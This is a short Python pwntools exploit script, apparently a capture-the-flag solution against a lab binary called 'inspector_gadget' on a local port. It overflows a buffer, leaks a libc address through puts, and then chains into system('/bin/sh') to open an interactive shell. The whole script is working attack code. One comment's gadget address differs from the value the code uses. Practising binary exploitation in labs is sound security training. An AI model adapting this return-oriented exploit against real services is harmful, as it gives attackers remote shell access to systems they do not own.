from pwn import *

context.log_level = "DEBUG"

elf = ELF("inspector_gadget")
context.binary = elf
libc = ELF("libc.so.6")

p = remote("localhost", 7005)
padding = b"A" * 24

# 0x000000000040128b : pop rdi ; ret
# 0x00000000004011a3 : pop rsi ; ret
ret = 0x0000000000401016
pop_rdi = 0x40127b
payload = padding + p64(pop_rdi) + p64(elf.got["__libc_start_main"]) + p64(elf.plt["puts"]) + p64(elf.sym["pwnme"])
p.sendline(payload)
p.recvuntil(b"pwn me\n")
leak = int.from_bytes(p.recvline()[:-1], byteorder="little")
libc.address = leak - libc.sym["__libc_start_main"]
print(hex(libc.address))
binsh = next(libc.search(b"/bin/sh\0"))
payload2 = padding + p64(pop_rdi) + p64(binsh) + p64(libc.sym["system"])
p.sendline(payload2)
p.interactive()
